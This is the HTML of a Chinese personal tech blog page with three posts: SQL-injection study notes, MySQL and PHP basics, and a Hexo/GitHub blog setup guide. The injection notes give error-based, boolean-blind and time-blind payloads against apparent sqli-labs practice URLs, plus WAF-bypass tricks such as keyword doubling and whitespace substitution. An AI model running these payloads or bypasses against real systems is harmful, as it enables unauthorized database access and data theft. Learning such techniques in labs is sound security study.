</article>







  
    <article id="post-SQL注入" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2022/03/21/SQL%E6%B3%A8%E5%85%A5/" class="article-date">
  	<time datetime="2022-03-21T02:19:18.382Z" itemprop="datePublished">2022-03-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/03/21/SQL%E6%B3%A8%E5%85%A5/">
        sql注入
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="clash-汉化"><a href="#clash-汉化" class="headerlink" title="clash 汉化"></a>clash 汉化</h4><h4 id="下载everything（window用于文件搜索）"><a href="#下载everything（window用于文件搜索）" class="headerlink" title="下载everything（window用于文件搜索）"></a>下载everything（window用于文件搜索）</h4><h4 id="下载Java"><a href="#下载Java" class="headerlink" title="下载Java"></a>下载Java</h4><ol>
<li>以管理员身份运行安装，配置环境变量：</li>
<li>新建系统变量：<br>更改系统变量path为：%JAVA_HOME%\bin;%SystemRoot%\system32;%SystemRoot%;%SystemRoot%\System32\Wbem;%SYSTEMROOT%\System32\WindowsPowerShell\v1.0<br>添加系统变量：<ul>
<li> “JAVA_HOME_8”—-&gt; “C:\Program Files\Java\jdk1.8.0_171”</li>
<li> “JAVA_HOME_11”—-&gt; “C:\Program Files\Java\jdk-11.0.13”</li>
<li> “JAVA_HOME_15”—-&gt; “C:\Program Files\Java\jdk-15.0.2”<h4 id="switchOmega中新建情景模式"><a href="#switchOmega中新建情景模式" class="headerlink" title="switchOmega中新建情景模式"></a>switchOmega中新建情景模式</h4></li>
</ul>
</li>
</ol>
<table>
<thead>
<tr>
<th>代理协议</th>
<th>代理服务器</th>
<th>代理端口</th>
</tr>
</thead>
<tbody><tr>
<td>http</td>
<td>127.0.0.1</td>
<td>8080</td>
</tr>
</tbody></table>
<hr>
<h4 id="proxy-模块"><a href="#proxy-模块" class="headerlink" title="proxy 模块"></a>proxy 模块</h4><blockquote>
<p>intercept模块：显示修改http请求及应答，并可以发送到其他模块</p>
<blockquote>
<p>Forward:发送数据<br>drop:丢弃请求包<br>intercept is off/on:拦截开关<br>action:右键功能</p>
</blockquote>
</blockquote>
<blockquote>
<p>http history模块：记录经过代理服务器的所有请求</p>
</blockquote>
<blockquote>
<p>options模块：</p>
<blockquote>
<p>proxy listeners:默认情况下burp监听127.0.0.1：8080<br>导入安全证书<br>intercept Client Request :配置拦截规则<br>Intercept Server Responses:<br>    1.基于服务端配置拦截规则，设置拦截的匹配规则<br>    2.Intercept request based on the following rules 为选中状态时，burpsuite会匹配响应包<br>Intercept Server Responses:<br>    1.基于服务端配置拦截规则，设置拦截的匹配规则<br>    2.Intercept request based on the following rules 为选中状态时，burpsuite会匹配响应包</p>
</blockquote>
</blockquote>
<hr>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>  union类型<br>  基于错误显示<br>  布尔类型<br>  基于时间<br>  其他类型</p>
<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><ul>
<li>查询语句一 union 查询语句二</li>
<li>（注：1.多条查询语句的查询列数是一致的 2.默认去重 3.页面必须要有显示位）</li>
<li>#：如果用户可控的传值位置不在末尾，#之后的语句会被注释掉</li>
<li>常用函数：</li>
<li>concat(),concat_ws():连接多个字符串 ， group_concat():将多行结果连成一组</li>
<li>information schema库：schemata,tables,columns</li>
</ul>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="floor报错注入："><a href="#floor报错注入：" class="headerlink" title="floor报错注入："></a>floor报错注入：</h4><p>1.floor0西数的作用是返回小于等于该值的最大整数，只返回arg1整数部分 ，小数部分舍弃。</p>
<p>2.标准Payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat(user),floor(rand(0)*2))x from information schema.tables group by x)y)</span><br></pre></td></tr></table></figure>

<h4 id="xpath语法错误"><a href="#xpath语法错误" class="headerlink" title="xpath语法错误"></a>xpath语法错误</h4><ul>
<li>extractvalue函数<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=&#x27;and(select extractvalue(1,concat(0x7e,(select语句))))</span><br></pre></td></tr></table></figure></li>
<li>updatexml函数<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=&#x27;and(select updatexml(1,concat(&#x27;~&#x27;,(select语句())),1))</span><br></pre></td></tr></table></figure>
注：<br>① 0x7e=’<del>’<br>② concat(‘a’,‘b’)=“ab”<br>③ version()=@@version<br>④ ‘</del>‘可以换成’#’、’$’等不满足xpath格式的字符<br>⑤ extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位</li>
</ul>
<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><ul>
<li>ascii() 函数，返回字符ascii码值</li>
<li>left() 函数，返回从左至右截取固定长度的字符串</li>
<li>substr()/substring() 函数 ， 返回从pos位置开始到length长度的子字符串</li>
</ul>
<ol>
<li>求当前数据库的长度<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (length(database()))&gt;7   (有回显)</span><br></pre></td></tr></table></figure></li>
<li>判断数据库名<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.32.113.109:40198/Less-1/?id=1&#x27; and ascii(substr(database(),4,4))=117--+(117对应ASCII表的u，即数据库名第四个字母是u)</span><br></pre></td></tr></table></figure>
<a target="_blank" rel="noopener" href="https://www.habaijian.com/">ascii表</a></li>
</ol>
<p>布尔盲注：<br>获取列名：<a target="_blank" rel="noopener" href="http://45.32.113.109:40198/Less-8/?id=1&#39;">http://45.32.113.109:40198/Less-8/?id=1&#39;</a> and ascii(substr((select distinct column_name from information_schema.columns where table_name=’users’ and table_schema=database()limit 0,1),1,1))=105–+<br>时间盲注：<a target="_blank" rel="noopener" href="http://45.32.113.109:50145/Less-9/?id=1&#39;and">http://45.32.113.109:50145/Less-9/?id=1&#39;and</a> if(length(database())&gt;5,sleep(5),1)–+</p>
<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h2 id="http头注入"><a href="#http头注入" class="headerlink" title="http头注入"></a>http头注入</h2><h2 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h2><h2 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h2><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h2 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h2><h3 id="常见参数"><a href="#常见参数" class="headerlink" title="常见参数"></a>常见参数</h3><p>1.-v 如：SQLmap -u -v 3</p>
<h2 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h2><h3 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h3><ul>
<li>创建数据库：CREATE DATABASE Idbnamel</li>
<li>删除数据库：drop database [dbname]</li>
<li>创建新表：create table Itablename (name char(10)Fage tinyint, sex int)</li>
<li>删除新表：drop table Itablename]</li>
<li>向表中插入内容：insert into [tablenamej(field1,field2 ) values(value 1,valuez)</li>
<li>删除内容：delete from [tablename] where 范围</li>
<li>更新内容：update Itablenamel set field1 =value1 where 范围</li>
<li>查找: select * from [tablename] where field1=” ichungiu”</li>
</ul>
<h3 id="服务器固定角色"><a href="#服务器固定角色" class="headerlink" title="服务器固定角色"></a>服务器固定角色</h3><table>
<thead>
<tr>
<th>角色</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>sysadmin</td>
<td>执行任何动作</td>
</tr>
<tr>
<td>serveradmin</td>
<td>配置服务器设置</td>
</tr>
<tr>
<td>setupadmin</td>
<td>安装复制和管理扩展过程</td>
</tr>
<tr>
<td>securityadmin</td>
<td>管理登录和create database的权限及阅读审计</td>
</tr>
<tr>
<td>processadmin</td>
<td>管理SQLserver进程</td>
</tr>
<tr>
<td>dbcreator</td>
<td>创建和修改数据库</td>
</tr>
<tr>
<td>diskadmin</td>
<td>管理磁盘文件</td>
</tr>
</tbody></table>
<ul>
<li>添加删除固定服务器成员的函数<br>sp_addsrvrolemember<br>sp_dropsrvrolemember</li>
</ul>
<h2 id="常见的过waf技巧"><a href="#常见的过waf技巧" class="headerlink" title="常见的过waf技巧"></a>常见的过waf技巧</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>   比如拦截了union，可以使用UNioN</p>
<h3 id="替换关键字"><a href="#替换关键字" class="headerlink" title="替换关键字"></a>替换关键字</h3><ol>
<li>关键字双写(利用waf的不完整，只过滤一次字符串)<br>比如select：SeleselectECT</li>
<li>同价词替换（waf主要是针对一些特殊的关键词进行检测）<br>比如:<br>and可以用&amp;&amp;替换，<br>or可以用||替换，<br>=可以用&lt;&gt;替换，<br>空格可以用%20%09%0a%0b%0c%0d%a0/**/替换（MySQL中%0a是换行）</li>
<li>编码绕过（利用浏览器上的进制转换或者语言编码规则来绕过waf）</li>
</ol>
<ul>
<li>URL编码</li>
</ul>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-mysql" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2022/03/16/mysql/" class="article-date">
  	<time datetime="2022-03-16T10:26:45.579Z" itemprop="datePublished">2022-03-16</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/03/16/mysql/">
        mysql
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="在ubuntu安装MySQL："><a href="#在ubuntu安装MySQL：" class="headerlink" title="在ubuntu安装MySQL："></a>在ubuntu安装MySQL：</h2><p> 查看有没有安装：<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l |grep mysql</span><br></pre></td></tr></table></figure><br> 安装mysql：<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install mysql-server</span><br></pre></td></tr></table></figure><br> 检查是否安装成功：<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net -tap | grep mysql</span><br></pre></td></tr></table></figure><br> 登录mysql：<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="mysql-常用的命令："><a href="#mysql-常用的命令：" class="headerlink" title="mysql 常用的命令："></a>mysql 常用的命令：</h2><ul>
<li>显示所有数据库：show database；</li>
<li>选定默认的数据库:use databasename;(databasename用数据库名字代替)</li>
<li>显示数据库中所有的表：show tables；</li>
<li>放弃正在输入的命令：\c</li>
<li>显示命令清单：\h</li>
<li>退出mysq程序：\q</li>
<li>查看服务器状态：\s</li>
</ul>
<hr>
<h2 id="使用PHP连接MySQL："><a href="#使用PHP连接MySQL：" class="headerlink" title="使用PHP连接MySQL："></a>使用PHP连接MySQL：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_connect(host, username, password, dbname,port, socket);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;Could not connect: &#x27; . mysqli_error());</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;数据库连接成功！&#x27;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<hr>
<table>
<thead>
<tr>
<th>操作</th>
<th>语句</th>
<th>PHP语法</th>
</tr>
</thead>
<tbody><tr>
<td>创建数据库</td>
<td>create database &lt;数据库名&gt;</td>
<td>mysqli_query(connection,query,resultmode);</td>
</tr>
<tr>
<td>删除数据库</td>
<td>drop database &lt;数据库名&gt;</td>
<td>mysqli_query(connection,query,resultmode);</td>
</tr>
<tr>
<td>选择数据库</td>
<td>use &lt;数据库名&gt;</td>
<td>mysqli_select_db(connection,dbname);</td>
</tr>
<tr>
<td>创建数据表</td>
<td>create table table_name (column_name coulumn_type),(column_name coulumn_type)</td>
<td>mysqli_query(connection,query,resultmode);</td>
</tr>
<tr>
<td>删除数据表</td>
<td>drop table table_name;</td>
<td>mysqli_query(connection,query,resultmode);</td>
</tr>
<tr>
<td>插入数据</td>
<td>insert into table_name (field1,field2,…)   values(value1,value2,…);</td>
<td>mysqli_query(connection,query,resultmode);</td>
</tr>
</tbody></table>
<hr>
<h2 id="mysql-语法："><a href="#mysql-语法：" class="headerlink" title="mysql 语法："></a>mysql 语法：</h2><ul>
<li><h3 id="where"><a href="#where" class="headerlink" title="where"></a>where</h3>(BINARY 关键字来设定 WHERE 子句的字符串比较是区分大小写的)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  select * from runoob_tbl where BINARY runoob_author=&#x27;runoob.com&#x27;;```</span><br><span class="line">* ### update</span><br></pre></td></tr></table></figure>
update runoob_tbl SET runoob_title=’学习 C++’ where runoob_id=3;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* ### delete</span><br></pre></td></tr></table></figure>
delete from table_name where name=”1”;<br>```</li>
<li><h3 id="link子句"><a href="#link子句" class="headerlink" title="link子句"></a>link子句</h3>模糊匹配，与%和_ 结合使用,如：</li>
</ul>
<p>‘%a’    ： //以a结尾的数据<br>‘a%’     ：//以a开头的数据<br>‘%a%’    ：//含有a的数据<br>‘_a_‘  ：三位且中间字母是a<br>‘_a’     //两位且结尾字母是a的<br>[]：表示括号内所列字符中的一个<br>[^] ：表示不在括号所列之内的单个字符。</p>
<ul>
<li><h3 id="union"><a href="#union" class="headerlink" title="union"></a>union</h3>将查询结果做并集，并且没有重复值</li>
</ul>
<p>==distinct==参数：删除结果集中重复的数据<br>==all==参数：返回所有的结果集包含重复的数据</p>
<ul>
<li><h3 id="Order-by"><a href="#Order-by" class="headerlink" title="Order by"></a>Order by</h3><p>排序：asc（升序）desc（降序）<br>通过 PHP 函数 ==mysqli_fetch_array()== 来输出所有查询的数据。<br><a target="_blank" rel="noopener" href="https://www.runoob.com/mysql/mysql-like-clause.html">详见</a></p>
</li>
<li><h3 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h3></li>
</ul>
<blockquote>
<p>在分组的列上我们可以使用 COUNT, SUM, AVG,等函数。<br>使用 ==WITH ROLLUP==，此函数是对聚合函数进行求和，注意 with rollup是对 group by 后的第一个字段，进行分组求和。ORDER BY不能在rollup中使用，两者为互斥关键字.<br>==coalesce(a,b,c)==: 设置一个可以取代 NUll 的名称(注：如果a=null,则选择b；如果b==null,则选择c；如果a!=null,则选择a；如果a b c 都为null ，则返回为null（没意义）。</p>
</blockquote>
<ul>
<li><h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><ul>
<li>join  ：获取两个表中字段匹配关系的记录。</li>
<li>left join ：获取左表所有记录，即使右表没有对应匹配的记录。</li>
<li>right join ：与 LEFT JOIN 相反，用于获取右表所有记录，即使左表没有对应匹配的记录</li>
</ul>
</li>
<li><h3 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h3><ul>
<li>BEGIN 开始一个事务</li>
<li>ROLLBACK 事务回滚</li>
<li>COMMIT 事务确认<br><a target="_blank" rel="noopener" href="https://www.runoob.com/mysql/mysql-transaction.html">详见</a></li>
</ul>
</li>
<li><h3 id="ALTER"><a href="#ALTER" class="headerlink" title="ALTER"></a>ALTER</h3></li>
</ul>
<p>修改数据表名或者修改数据表字段</p>
<ol>
<li><p>删除:<br><code>alter table &lt;table_name&gt; drop &lt;字段名&gt;；</code></p>
</li>
<li><p>添加:<br><code>alter table &lt;table_name&gt; add &lt;字段名&gt; &lt;字段类型&gt;;</code></p>
</li>
<li><p>修改字段类型及名称:</p>
<p> 在ALTER命令中使用 ==MODIFY== 或 ==CHANGE== 子句<br>如：把字段 c 的类型从 CHAR(1) 改为 CHAR(10):<br><code>ALTER TABLE testalter_tbl MODIFY c CHAR(10);</code><br>在 CHANGE 关键字之后，紧跟着的是你要修改的字段名，然后指定新字段名及类型<br><code>ALTER TABLE testalter_tbl CHANGE i j BIGINT; </code></p>
</li>
<li><p>修改表名<br><code>mysql&gt; ALTER TABLE testalter_tbl RENAME TO alter_tbl;</code></p>
</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/mysql/mysql-alter.html">详见</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-如何创建博客" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2022/03/13/%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E5%8D%9A%E5%AE%A2/" class="article-date">
  	<time datetime="2022-03-13T06:26:27.602Z" itemprop="datePublished">2022-03-13</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/03/13/%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E5%8D%9A%E5%AE%A2/">
        如何搭建自己的博客
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>有了自己的博客系统之后，就有了一个自己固定的展示平台</p>
<h2 id="用hexo和github搭建博客需要的工具"><a href="#用hexo和github搭建博客需要的工具" class="headerlink" title="用hexo和github搭建博客需要的工具"></a>用hexo和github搭建博客需要的工具</h2><h3 id="下载node"><a href="#下载node" class="headerlink" title="下载node"></a>下载node</h3><ul>
<li><p>它让JavaScript成为与PHP、Python等服务的端平起平坐得的脚本语言</p>
<p>   <a target="_blank" rel="noopener" href="https://www.cnblogs.com/liuqiyun/p/8133904.html">安装教程</a></p>
</li>
</ul>
<h2 id="下载git"><a href="#下载git" class="headerlink" title="下载git"></a>下载git</h2><ul>
<li><p>他是一个开源的分布式版本控制系统</p>
<p>   <a target="_blank" rel="noopener" href="https://www.cnblogs.com、xueweisuoyong/p/11914045.html">安装教程</a></p>
</li>
</ul>
<h2 id="下载hexo"><a href="#下载hexo" class="headerlink" title="下载hexo"></a>下载hexo</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure>

<p>检查是否安装完成：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo -v</span><br></pre></td></tr></table></figure>


<h2 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h2><ul>
<li><p>注册一个github账号</p>
</li>
<li><p>用github创建一个仓库（注意：仓库名应该为：用户名.github.io)</p>
<p>  <a target="_blank" rel="noopener" href="https://www.bilibili.com/red/cv5107169">教程</a></p>
</li>
</ul>
<h2 id="生成SSH-keys"><a href="#生成SSH-keys" class="headerlink" title="生成SSH keys"></a>生成SSH keys</h2><ul>
<li><p>在文件中打开gitbush</p>
<p>  <code>ssh</code></p>
<p>  <code>SSH-keygen -t rsa -C &quot;邮件地址&quot;</code></p>
</li>
<li><p>在磁盘中找到.ssh/.pub,打开复制内容</p>
</li>
<li><p>打开github -&gt; setting -&gt; ssh -&gt; add一个钥匙 将复制内容粘贴</p>
</li>
<li><p>测试ssh是否绑定成功</p>
<p>  <code>SSH -T git@github.com</code></p>
<pre><code>看见hello 用户名即为成功
</code></pre>
</li>
</ul>
<h2 id="在本地生成"><a href="#在本地生成" class="headerlink" title="在本地生成"></a>在本地生成</h2><ul>
<li><p>在磁盘新建文件夹blog</p>
</li>
<li><p>在文件夹打开gitbush</p>
<p>  初始化：<br>  <code>        hexo init</code></p>
<p>  生成本地页面：<br>  <code>hexo s</code></p>
</li>
</ul>
<h2 id="发布到网上"><a href="#发布到网上" class="headerlink" title="发布到网上"></a>发布到网上</h2><ul>
<li>修改blog里config.yml的内容</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">		type:git</span><br><span class="line">		repository:(github的地址）</span><br><span class="line">		branch：main</span><br><span class="line">		token：</span><br></pre></td></tr></table></figure>
<ul>
<li>token 获取方法：在github中-&gt;setting -&gt; developer settings -&gt;personal access tokens -&gt; Generate new token</li>
<li>可以直接将文件夹拖入仓库</li>
<li>然后就可以在网络上访问你的博客了！</li>
</ul>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2022 GXY BLOG
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: false,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




  </div>
</body>
</html>